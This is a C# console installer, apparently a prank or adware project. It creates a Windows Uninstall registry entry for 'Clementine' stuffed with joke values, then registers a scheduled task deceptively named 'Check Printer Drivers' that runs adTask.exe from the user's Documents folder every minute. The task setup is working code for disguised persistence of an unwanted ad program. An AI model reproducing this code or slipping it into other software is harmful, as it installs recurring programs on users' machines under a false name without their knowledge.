using System;
using System.IO;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;

namespace Installer
{
    static class Install
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Installing");
            WriteToRegistry();
            StartAdsTask();
            Console.ReadLine();
        }

        private static void WriteToRegistry()
        {
            try
            {
                using (var entry = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\clementine"))
                {
                    entry.SetValue("DisplayName", "Clementine");
                    entry.SetValue("DisplayVersion", 0);
                    entry.SetValue("Publisher", "Not Andrew Miranti");
                    entry.SetValue("VersionMinor", 0);
                    entry.SetValue("VersionMajor", 0);
                    entry.SetValue("Version", "0");
                    entry.SetValue("HelpLink", "http://www.google.com");
                    entry.SetValue("HelpTelephone", "911");
                    entry.SetValue("InstallDate", "September 25, 1066");
                    entry.SetValue("InstallLocation", "C:\\");
                    entry.SetValue("InstallSource", "A:\\");
                    entry.SetValue("URLInfoAbout", "http://en.wikipedia.org");
                    entry.SetValue("URLUpdateInfo", "http://en.wikipedia.org/wiki/Philosophy");
                    entry.SetValue("AuthorizedCDFPrefix", "Cupcakes");
                    entry.SetValue("Comments", "Oh my darling...");
                    entry.SetValue("Contact", "Direct all hate mail to Santa.");
                    entry.SetValue("EstimatedSize", 0x50000000);
                    entry.SetValue("Language", 1033);
                    entry.SetValue("ModifyPath", "B:\\");
                    entry.SetValue("Readme", "");
                    entry.SetValue("UninstallString", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "clementine", "Clementine.exe"));
                    entry.SetValue("SettingsIdentifier", "");
                }
            } catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        private static void StartAdsTask()
        {
            using (var scheduler = new TaskService())
            {
                var adTask = scheduler.NewTask();
                adTask.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "clementine", "adTask.exe")));
                var trigger = new TimeTrigger();
                trigger.Repetition.Interval = TimeSpan.FromMinutes(1);
                adTask.Triggers.Add(trigger);
                TaskService.Instance.RootFolder.RegisterTaskDefinition("Check Printer Drivers", adTask);
            }
        }
    }
}
